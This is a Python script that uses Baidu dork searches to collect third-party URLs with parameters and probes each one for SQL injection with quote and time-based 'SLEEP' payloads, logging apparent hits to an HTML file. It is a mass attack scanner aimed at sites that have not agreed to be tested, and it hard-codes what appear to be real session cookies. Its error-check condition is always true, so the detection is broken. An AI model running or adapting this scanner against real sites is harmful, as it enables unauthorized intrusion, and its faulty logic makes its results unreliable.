#!/usr/bin/python3
import sys,requests,threading,time
from bs4 import BeautifulSoup
urla = 'https://www.baidu.com/s?wd='
urlb = '&pn='
header={
'Host': 'www.baidu.com',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'zh-CN,en-US;q=0.7,en;q=0.3',
'Accept-Encoding': 'gzip, deflate, br',
'Connection': 'keep-alive',
'Cookie': 'BAIDUID=4F259306657E7E7F3A6DC838C684BC84:FG=1; BIDUPSID=421098D130C66ABF4F1EAF4C10104DCD; PSTM=1599464193; BD_UPN=13314752; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; H_PS_PSSID=7540_32617_1455_32739_31254_7580_7630_32116_32719_32580; H_PS_645EC=b82baC3QnFOVGYoDYaYIDXiOE%2FxoczIjqLJhpJ2UJYu%2FSXWKeOoHmCkUKhg; COOKIE_SESSION=94_0_9_6_4_9_0_0_9_6_1_0_220259_0_0_0_1599837926_0_1600278990%7C9%230_0_1600278990%7C1; delPer=0; BD_CK_SAM=1; PSINO=2; ZD_ENTRY=baidu; BDRCVFR[Hp1ap0hMjsC]=mk3SLVN4HKm; BD_HOME=1',
'Upgrade-Insecure-Requests': '1',
'Cache-Control': 'max-age=0'
}
header2={
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36 Edg/81.0.416.58'
}
 
huixian = 'on line'
huixian2 = '查询表达式'
huixian3 = 'Microsoft JET Database Engine'
def main(key,ye):
    urlc =  urla + key + urlb + ye
    try:
        r = requests.get(url=urlc,headers=header)
        soup = BeautifulSoup(r.text,'html.parser')
        urls = soup.find_all(name='a',target="_blank",attrs={'class':None,'id':None})
        for a in urls:
            r = requests.get(url=a['href'],headers=header2,timeout = 1)
            if '=' in r.url:
                print(f"target：{r.url}")
                check(r.url)
    except:
        pass
def check(url):
    try:
        payload= url+'%27'
        r = requests.get(url=payload,headers=header2,timeout = 1)
        if huixian or huixian2 or huixian3 in str(r.content):
            result(url)
        payload= url+'"'
        r = requests.get(url=payload,headers=header2,timeout = 1)
        if huixian or huixian2 or huixian3 in str(r.content):
            result(url)
        try:
            timepayload = url + '%20and%20SlEep(2)'
            r = requests.get(url=timepayload,headers=header2,timeout = 1)
        except requests.exceptions.Timeout:
            r = requests.get(url=timepayload,headers=header2,timeout = 3)
            if r.status_code == 200:
                result(timepayload)
    except:
        pass
def result(url):
    result = open('result.html', 'a+')
    with open('result.html') as f:
        if url not in f.read():
            if 'SlEep' not in url:
                print(f"[+]{url}——该网站可能存在注入Σ(⊙▽⊙'a")
                result.write('<a href="' + url + '" target="_blank">' + url +'——该网站可能存在注入Σ(⊙▽⊙"a'+ '</a>'+'\r\n</br>')
            else:
                print(f"[+]{url}——该网站可能存在延时注入Σ(⊙▽⊙'a")
                result.write('<a href="' + url + '" target="_blank">' + url +'——该网站可能存在延时注入Σ(⊙▽⊙"a'+ '</a>'+'\r\n</br>')
            result.close()
 
if __name__ == '__main__':
    if len(sys.argv) == 2:
        key = sys.argv[1]
        print('开始探测存在注入的网站喽~ Σ(⊙▽⊙"a ')
        for i in range(0,800,10):
            threadl = []
            t=threading.Thread(target=main,args=(str(key),str(i)))
            threadl.append(t)
            for s in threadl:
                s.start()
                time.sleep(0.01)
    else:
        print("Tips：python3 exp.py inurl:php?id=")